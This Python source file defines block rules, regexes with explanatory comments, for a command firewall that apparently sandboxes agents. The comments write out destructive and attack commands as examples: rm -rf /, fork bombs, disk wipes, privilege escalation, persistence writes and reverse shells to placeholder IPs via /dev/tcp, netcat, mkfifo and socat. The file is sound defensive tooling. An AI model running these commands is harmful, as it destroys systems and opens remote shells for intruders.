"""Built-in critical blocklist rules for the interruptor.

These rules are ALWAYS active and cannot be removed — only overridden to
``warn`` level by user rules. They ship with the interruptor package.
"""

from __future__ import annotations

from .rules import Rule

BUILTIN_BLOCKLIST: list[Rule] = [
    Rule(
        rule_id="builtin-kill-all",
        description="Mass process kill",
        priority=1000,
        action="block",
        block_message="Mass process kill (kill -9 -1) is blocked.",
        match={
            "type": "pattern",
            # Mass-kill invariant: in `kill` syntax, signal specs come
            # first, then pid operands. `-1` is a MASS-KILL PID when it
            # is NOT the first operand (kill 123 -1, kill -9 -1,
            # kill -1 -1) or when preceded by `--` (kill -- -1);
            # `-1` in first-operand position is a SIGNAL (kill -1 123
            # is SIGUSR1 to pid 123 — legit). TJ-GAP-053: quote chars
            # added to the terminator class so quoted/embedded forms
            # (node -e 'execSync("kill -9 -1")', kill -9 "-1") match too.
            # = SIGHUP, benign). The pattern requires at least one
            # operand before the pid `-1` (signal spec and/or pid),
            # excludes `-1` as the argument of -s/-n/-l (not a pid),
            # and ends at a token/segment boundary so compound forms
            # (kill -- -1; echo x, kill -9 -1 && echo hi) still match.
            # `(?<!\S)` is the token-start boundary (plain \b can never
            # sit between a space and a dash); re.IGNORECASE covers
            # -TERM/-SIGKILL.
            "pattern": r"(?<![A-Za-z0-9])kill\s+(?:-s\s+\S+\s+|-n\s+\S+\s+|--\s+|-(?!l)\S+\s+|\d+\s+)+(?<!-s\s)(?<!-n\s)(?<!\S)-1(?:\s|;|\||&|\)|`|$|[\"'])",
        },
    ),
    Rule(
        rule_id="builtin-killpg-pid1",
        description="Process-group kill targeting PID 1 or own process group (killpg API)",
        priority=1000,
        action="block",
        block_message="Process-group kill targeting PID 1 or own process group (killpg(0/1, ...)) is blocked — this is the MagicMock incident vector.",
        match={
            "type": "pattern",
            "pattern": r"(os\.killpg|killpg)\s*\(\s*[01]\s*,|os\.kill\s*\(\s*[01]\s*,|process\.kill\s*\(\s*-?[01]\s*,|kill\(-?[01],|kill\s*\(\s*[01]\s*,\s*(9|SIGKILL)",
        },
    ),
    Rule(
        rule_id="builtin-fork-bomb",
        description="Fork bomb pattern (any function name, not just ':')",
        priority=1000,
        action="block",
        block_message="Fork bomb pattern detected and blocked.",
        match={
            "type": "pattern",
            # Tolerate arbitrary whitespace between `:|:&` so the
            # wrapper-quoted argv form ``':' '(){' ':' '|:' '&' '};:'``
            # (which produces ``: (){ : |: & };:`` after the bridge
            # strips the per-token quote pairs) is still caught.
            # TJ-GAP-053: named-func variants (bomb(){ bomb|bomb & };bomb)
            # passed the classic pattern — generalized via backreference.
            # Guards are LOOKAROUNDS, not \b: ':' is non-word so \b never
            # matches before it (regression: classic form must stay caught);
            # lookarounds exclude word-char neighbors on both sides, which
            # still defeats substring tricks (bomb(){ bombard|bomb & };bomb).
            "pattern": r"([A-Za-z_]\w*|:)\s*\(\s*\)\s*\{[^}]*(?<![\w:])\1\s*\|\s*\1(?![\w:])[^}]*&[^}]*\}\s*;\s*\1(?![\w:])",
        },
    ),
    Rule(
        rule_id="builtin-rm-rf-root",
        description="Recursive root filesystem removal",
        priority=1000,
        action="block",
        block_message="Recursive root directory removal (rm -rf /) is blocked.",
        match={
            "type": "pattern",
            # Root-scoped recursive-delete rule (TJ-DF-001): the flag set
            # is matched order-independently via two lookaheads (any
            # recursive flag: -r/-R/--recursive, possibly combined like
            # -rf/-fr; any force flag: -f/--force), and the target must be
            # exactly "/" or "/*" (root glob). This catches the canonical
            # GNU forms `rm -rf --no-preserve-root /`, `rm -r -f /`,
            # `rm --recursive --force /`, and `rm -rf/`. `(?<!\S)` is the
            # token-start boundary (plain \b can never sit between a space
            # and a dash); re.IGNORECASE covers -R. TJ-GAP-042: the target
            # boundary is extended to quotes/parens/backtick so destructive
            # commands EMBEDDED in quoted interpreter args (python3 -c
            # "...", bash -c '...', echo "rm -rf /") also trip the rule —
            # previously only whitespace/end-of-string qualified, so the
            # quoted forms passed as ALLOW (battery-proven 2026-08-22).
            "pattern": r"\brm\s+(?=[^|;&]*(?<!\S)(?:-[a-z]*r[a-z]*|--recursive)\b)(?=[^|;&]*(?<!\S)(?:-[a-z]*f[a-z]*|--force)\b)[^|;&]*\s*/(?:\*)?(?:\s|$|[\"')`])",
        },
    ),
    Rule(
        rule_id="builtin-dd-root",
        description="Raw device write via dd",
        priority=1000,
        action="block",
        block_message="Raw device writes (dd to /dev/*) are blocked.",
        match={
            "type": "pattern",
            "pattern": r"dd\s+.*of=/dev/",
        },
    ),
    Rule(
        rule_id="builtin-mkfs",
        description="Filesystem creation",
        priority=1000,
        action="block",
        block_message="Filesystem creation commands (mkfs.*) are blocked.",
        match={
            "type": "pattern",
            # Match ``mkfs.<type>`` (e.g. mkfs.ext4) AND the bash-syntax
            # variant ``mkfs .ext4`` where the type is a separate argv
            # token (the wrapper-quoted form ``'mkfs' '.ext4' ...``
            # surfaces as ``mkfs .ext4 /dev/sdb1`` once the bridge strips
            # the per-token quote pairs). The lookahead avoids matching
            # benign text that merely mentions ``mkfs`` (e.g.
            # ``echo mkfs``).
            "pattern": r"mkfs(?:\.|\s+\.)",
        },
    ),
    Rule(
        rule_id="builtin-fdisk",
        description="Partition manipulation",
        priority=1000,
        action="block",
        block_message="Partition manipulation (fdisk, parted, gdisk) is blocked.",
        match={
            "type": "pattern",
            "pattern": r"fdisk|parted|gdisk",
        },
    ),
    Rule(
        rule_id="builtin-chmod-777-root",
        description="World-writable root",
        priority=1000,
        action="block",
        block_message="Setting world-writable permissions on root (/) is blocked.",
        match={
            "type": "pattern",
            # World-writable mode on a /-rooted path (TJ-DF-011): the mode
            # token (777, 7777, or a+rwx) is matched order-independently via
            # a lookahead, and the recursive flag (-R/--recursive) via an
            # OPTIONAL second lookahead — plain `chmod 777 /` must still
            # block. The target keeps the old `\s+/` semantics: ANY path
            # starting with / (e.g. /var/www) blocks, which is intentional
            # and tested. `(?<!\S)` is the token-start boundary (plain \b
            # can never sit between a space and a dash); re.IGNORECASE
            # covers -R.
            "pattern": r"\bchmod\s+(?=[^|;&]*(?<!\S)(?:7777|777|a\+rwx)\b)(?=[^|;&]*(?<!\S)(?:-[a-z]*r[a-z]*|--recursive)\b)?[^|;&]*\s+/",
        },
    ),
    Rule(
        rule_id="builtin-echo-to-system",
        description="Redirect output to system paths",
        priority=1000,
        action="block",
        block_message="Writing to system paths (/etc/, /boot/) is blocked.",
        match={
            "type": "pattern",
            "pattern": r">\s*/etc/|>>\s*/etc/|>\s*/boot/|>>\s*/boot/",
        },
    ),
    Rule(
        rule_id="builtin-curl-pipe-shell",
        description="Curl/wget piping to shell",
        priority=1000,
        action="block",
        block_message="Piping downloads directly to a shell is blocked. Use package managers instead.",
        match={
            "type": "pattern",
            "pattern": r"(curl|wget)\b.*\|\s*(bash|sh|dash|zsh)",
        },
    ),
    Rule(
        rule_id="builtin-sudo",
        description="Privilege escalation via sudo/doas/su/pkexec",
        priority=1000,
        action="block",
        block_message="Privilege escalation (sudo/doas/su/pkexec) is blocked in the sandbox.",
        match={
            "type": "pattern",
            # TJ-GAP-053: sudo was the only covered escalator; doas/su/pkexec
            # passed (probe 2026-09-16). \bsu\s requires whitespace so sudo/
            # support/setuptools substrings never match.
            "pattern": r"\b(?:sudo|doas|pkexec|su)\s",
        },
    ),
    Rule(
        rule_id="builtin-code-injection",
        description="Code-injection vectors in interpreter arguments (os.system, os.popen, shutil.rmtree, subprocess, eval, exec, __import__)",
        priority=1000,
        action="block",
        block_message="Code-injection vectors (os.system/os.popen/shutil.rmtree/subprocess/eval/exec/__import__) are blocked — quoted interpreter code is scanned, not just shell syntax.",
        match={
            "type": "pattern",
            # TJ-GAP-042: the rm-rf-root rule previously only matched a
            # root target followed by whitespace/end-of-string, so
            # destructive code inside QUOTED interpreter arguments
            # (python3 -c '...os.system("rm -rf /")...',
            # python3 -c "...eval(open('/etc/passwd').read())...")
            # passed as ALLOW. This rule scans the RAW command string for
            # the Python/Ruby exec API surface — same design as
            # builtin-killpg-pid1 (block on presence anywhere). Spec T-I33
            # ("heuristic detection") was parser-only; this makes it a
            # real block rule. Battery-proven gap 2026-08-22 (kara-lair).
            "pattern": r"\b(os\.system|os\.popen|shutil\.rmtree|subprocess\.(?:call|run|Popen|check_call|check_output))\s*\(|\b(eval|exec|__import__)\s*\(",
        },
    ),
    # ── TJ-GAP-053 wave (probe 2026-09-16: 25 real-world escape techniques) ──
    Rule(
        rule_id="builtin-indirect-shell",
        description="Encoded/piped shell execution (base64 -d | sh, printf-decode | bash)",
        priority=1000,
        action="block",
        block_message="Decode-then-execute pipelines (base64/printf | sh) are blocked — the firewall cannot inspect what runs.",
        match={
            "type": "pattern",
            "pattern": r"\bbase64\s+[^|;]*\|\s*(bash|sh|dash|zsh|ksh)\b|\b(printf|echo)\b[^|;]*\\x[0-9a-f]{2}[^|;]*\|\s*(bash|sh|dash|zsh|ksh)\b",
        },
    ),
    Rule(
        rule_id="builtin-vm-delete",
        description="Bulk unlink via find -delete",
        priority=1000,
        action="block",
        block_message="find -delete / -exec bulk or arbitrary-command execution is blocked.",
        match={
            "type": "pattern",
            # Any find (absolute or relative) arming -delete/-exec/-ok:
            # -delete is rm-class destruction, -exec/-ok is arbitrary
            # command execution per matched file. Plain finds stay allowed.
            "pattern": r"\bfind\s[^|;&]*\s-(?:delete|exec|execdir|ok)\b",
        },
    ),
    Rule(
        rule_id="builtin-device-write",
        description="Raw device writes outside dd (shred, wipefs, cat/urandom redirects)",
        priority=1000,
        action="block",
        block_message="Raw block-device writes (shred/wipefs/cat > /dev/sd*) are blocked.",
        match={
            "type": "pattern",
            "pattern": r"\b(?:shred|wipefs|blkdiscard)\b[^|;&]*\s/dev/|>\s*/dev/(?:sd[a-z]|nvme\d|hd[a-z]|vd[a-z]|mmcblk\d)",
        },
    ),
    Rule(
        rule_id="builtin-ns-escape",
        description="Namespace/jail escape tooling (nsenter into a foreign PID, chroot, setpriv to uid 0)",
        priority=1000,
        action="block",
        block_message="Namespace escape tooling (nsenter -t <pid>, chroot, setpriv/setuid to 0) is blocked.",
        match={
            "type": "pattern",
            "pattern": r"\bnsenter\s[^|;&]*-t\s|\bchroot\s|\bsetpriv\s[^|;&]*--(?:reuid|setuid|clear-groups)\b|\bunshare\s[^|;&]*-r\b",
        },
    ),
    Rule(
        rule_id="builtin-persistence",
        description="Persistence install (crontab write, rc.local, systemd unit drop)",
        priority=1000,
        action="block",
        block_message="Persistence writes (crontab -, /etc/cron*, rc.local, systemd units) are blocked.",
        match={
            "type": "pattern",
            "pattern": r"\bcrontab\s+(?:-(?:\s|$)|-l?\s*<|-[a-z]*\s*/etc/)|/etc/cron\.(?:d|daily|hourly)/|/etc/rc\.local\b|/etc/systemd/system/[^|;&]*\.(?:service|timer)\b",
        },
    ),
    Rule(
        rule_id="builtin-script-killall",
        description="killall/pkill with SIGKILL (mass-kill by process name)",
        priority=1000,
        action="block",
        block_message="killall/pkill -9 is blocked (mass kill by name). Non-KILL killall/pkill is allowed for legit restarts.",
        match={
            "type": "pattern",
            "pattern": r"\b(?:killall|pkill)\s+(?:-[a-zA-Z]*9[a-zA-Z]*\s|--signal\s*(?:SIGKILL|9)\s|--kill\s)",
        },
    ),
    Rule(
        rule_id="builtin-interpreter-escape",
        description="Interpreter APIs that destroy state (perl/ruby/node/python: unlink, rm_rf, rmSync, fork loops, execSync of kills)",
        priority=1000,
        action="block",
        block_message="Interpreter destruction APIs (unlink/rm_rf/rmSync/execSync-masskill/os-fork-loop) are blocked — same design as the code-injection rule.",
        match={
            "type": "pattern",
            # Covered forms: perl unlink/rmtree, ruby FileUtils.rm_rf,
            # node fs.rmSync + child_process.execSync("kill -9 -1"),
            # python os.fork() loops (fork-bomb via API).
            # child_process.exec/execSync arming requires a kill shape in
            # the SAME command string (probe 2026-09-16: node-exec-kill).
            "pattern": r"\bperl\b[^|;&]*\bunlink\b|\bperl\b[^|;&]*\brmtree\b|FileUtils\.rm_rf\(|\brmSync\s*\(|child_process\.(?:exec|execSync)\s*\([^)]*(?:kill|rm)\b|os\.fork\s*\(\s*\)\s*(?:while|for)|while\s+[^;\n]*:\s*os\.fork\s*\(",
        },
    ),
    Rule(
        rule_id="builtin-self-rewrite",
        description="Self-modification vectors (rm on the rules/config itself, mv-over",
        priority=1000,
        action="block",
        block_message="Rewriting terminal-jail's own rules/config is blocked.",
        match={
            "type": "pattern",
            "pattern": r"\brm\s+[^|;&]*terminal-jail/(?:rules|00-builtins)|\bmv\s+[^|;&]*\s[^|;&]*terminal-jail/rules|\bcat\s+[^|;&]*>\s*/etc/terminal-jail/|>\s*~/.config/terminal-jail/rules",
        },
    ),
    Rule(
        rule_id="builtin-var-indirection",
        description="Variable-indirection shell destruction (D=/; rm -rf $D and friends)",
        priority=1000,
        action="block",
        block_message="Variable-indirection destructive forms (var=/ then rm -rf $var) are blocked.",
        match={
            "type": "pattern",
            # Root assigned to a var, then an rm of that var — the var must
            # be a bare `/` or `/*` assignment to qualify as root-scoped.
            "pattern": r"\b[A-Za-z_]\w*=/\s*;\s*rm\s+(?=[^|;&]*-[a-zA-Z]*r)|\b[A-Za-z_]\w*=/\*\s*;\s*rm\s+(?=[^|;&]*-[a-zA-Z]*r)",
        },
    ),
    # ── TJ-GAP-058 network-egress wave (probe 2026-09-16: egress was the ──
    # ── largest wholly-uncovered class — nothing in the engine touched it) ──
    Rule(
        rule_id="builtin-net-devtcp-redirect",
        description="Network-fd redirect reverse shell (/dev/tcp, /dev/udp)",
        priority=1000,
        action="block",
        block_message="Reverse shell through a network file descriptor (redirect into /dev/tcp/... or /dev/udp/...) is blocked.",
        match={
            "type": "pattern",
            # bash exposes /dev/tcp/<host>/<port> and /dev/udp/<host>/<port>
            # as network sockets: `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`,
            # `exec 3<>/dev/tcp/host/port`, `cat < /dev/tcp/host/port`.
            # The rule requires a REDIRECT OPERATOR bound to the fd path, so
            # a mere mention inside a string/argument (`echo 'see /dev/tcp'`,
            # `grep -rn '/dev/tcp' docs/`, `rsync host:/dev/tcp/x .`) is NOT
            # matched. Operators are listed longest-first for readability:
            # &>  >&  >>  <>  <<  >  <  (each followed by optional spaces).
            # Two-char op first so `>&` never degrades into `>` + `&`.
            "pattern": r"(?:&>|>&|>>|<>|<<|>|<)\s*/dev/(?:tcp|udp)/\S",
        },
    ),
    Rule(
        rule_id="builtin-net-mkfifo-reverse-shell",
        description="mkfifo feedback-loop reverse shell (fifo + shell + network client)",
        priority=1000,
        action="block",
        block_message="mkfifo feedback-loop reverse shell is blocked — a fifo wired from a shell into a network client is the canonical two-way shell.",
        match={
            "type": "pattern",
            # The classic two-way loop:
            #   mkfifo /tmp/f
            #   cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f
            # Both halves of the wiring must be present in the SAME command
            # string: a shell (`sh`/`bash`/`dash`/`ksh`, optionally
            # path-qualified) AND a pipe into a network client. A lone
            # `mkfifo /tmp/f` (or `mkfifo /tmp/f; tail -f /tmp/f`) stays
            # allowed, so ordinary fifo use is not over-blocked. The
            # lookaheads deliberately cross `;`/`|` ([\s\S]*) because the
            # vector is a MULTI-SEGMENT command; every other rule in this
            # file stays segment-local via [^|;&]*.
            # Ordered before builtin-net-nc-shell-attach so this more
            # specific combination is the rule that claims the vector.
            "pattern": r"\bmkfifo\b(?=[\s\S]*(?<![\w/.-])(?:/bin/|/usr/bin/)?(?:sh|bash|dash|ksh)\b)(?=[\s\S]*\|\s*(?:nc|ncat|netcat|socat)\b)",
        },
    ),
    Rule(
        rule_id="builtin-net-nc-shell-attach",
        description="netcat/ncat with a shell attach (-e/-c/--exec or a shell on either side of a pipe)",
        priority=1000,
        action="block",
        block_message="netcat/ncat with a shell attach (-e / -c / --exec, or a shell piped to/from the connection) is blocked — that is a reverse shell, not a port check.",
        match={
            "type": "pattern",
            # Four arms, one per attach shape:
            # 1. exec flag: nc -e /bin/sh 10.0.0.1 4444, nc -e/bin/bash ...,
            #    ncat --exec /bin/bash ..., ncat --sh-exec 'sh ...'
            # 2. ncat -c <shell>: the -c operand must BE a shell (ncat's -c
            #    is --sh-exec) so an unrelated -c on another nc dialect does
            #    not trip it; quote-stripped form (`-c 'sh'` -> `-c sh`) is
            #    covered by the matcher's normalized candidate.
            # 3. connection piped INTO a shell: `nc 10.0.0.1 4444 | sh`
            # 4. shell piped INTO the connection: `bash -i 2>&1 | nc host 4444`
            #    — the shell may carry options and fd redirects (`-i`, `2>&1`)
            #    before the pipe, and the client must be given host + port
            #    (numeric or $var), so `cmd | nc host port` data sends and
            #    `bash -c 'x' && tar ... | nc` chains are NOT matched.
            # `nc -z example.com 443` (port check) has no shell attach and is
            # the pinned ALLOW control.
            "pattern": r"(?<![\w.-])(?:nc|ncat|netcat)\s[^|;&]*(?<![\w-])(?:--exec|--sh-exec|-e)\b|(?<![\w.-])(?:nc|ncat|netcat)\s[^|;&]*(?<![\w-])-c\s+(?:/bin/|/usr/bin/)?(?:sh|bash|dash|zsh|ksh)\b|(?<![\w.-])(?:nc|ncat|netcat)\b[^|;&]*\|\s*(?:/bin/|/usr/bin/)?(?:bash|sh|dash|zsh|ksh)\b|(?<![\w/.-])(?:/bin/|/usr/bin/)?(?:bash|sh|dash|zsh|ksh)\b(?:\s+(?:-\S+|\d?>&?\d+))*\s*\|\s*(?:nc|ncat|netcat)\s+(?:-\S+\s+)*\S+\s+(?:\d+|\$\S+)",
        },
    ),
    Rule(
        rule_id="builtin-net-socat-exec",
        description="socat EXEC:/SYSTEM: wired to a network endpoint",
        priority=1000,
        action="block",
        block_message="socat wired to EXEC:/SYSTEM: over a network address is blocked — it spawns a remote-command shell over the socket.",
        match={
            "type": "pattern",
            # `socat TCP:host:port EXEC:/bin/sh`,
            # `socat exec:'bash -li',pty,... tcp:host:port`,
            # `socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash`,
            # `socat UDP:host:port SYSTEM:'sh -c id'`, openssl:/sctp: forms.
            # Both halves are required in the same segment via two
            # lookaheads, so a plain relay/listener stays allowed:
            # `socat TCP-LISTEN:8080,fork,reuseaddr -` and
            # `socat - TCP:127.0.0.1:9092` (no EXEC:/SYSTEM:) do NOT match.
            "pattern": r"(?<![\w.-])socat\s+(?=[^|;&]*(?<![\w-])(?:exec|system):)(?=[^|;&]*(?<![\w-])(?:tcp|udp|sctp|openssl)(?:4|6)?(?:-listen|-connect|-recvfrom|-sendto)?:)",
        },
    ),
    Rule(
        rule_id="builtin-net-openssl-pipe-shell",
        description="openssl s_client piped into a shell",
        priority=1000,
        action="block",
        block_message="Piping an openssl s_client TLS session into a shell is blocked — a bare s_client diagnostic (no shell pipe) stays allowed.",
        match={
            "type": "pattern",
            # `openssl s_client -quiet -connect 1.2.3.4:443 | sh` — the TLS
            # session becomes the shell's stdio. The pipe target must be a
            # shell, so the pinned diagnostic
            # `openssl s_client -connect example.com:443` and TLS-inspection
            # pipelines (`... | openssl x509 -noout -dates`,
            # `... | grep subject=`) are NOT matched.
            "pattern": r"(?<![\w.-])openssl\s+s_client\b[^|;&]*\|\s*(?:/bin/|/usr/bin/)?(?:bash|sh|dash|zsh|ksh)\b",
        },
    ),
]
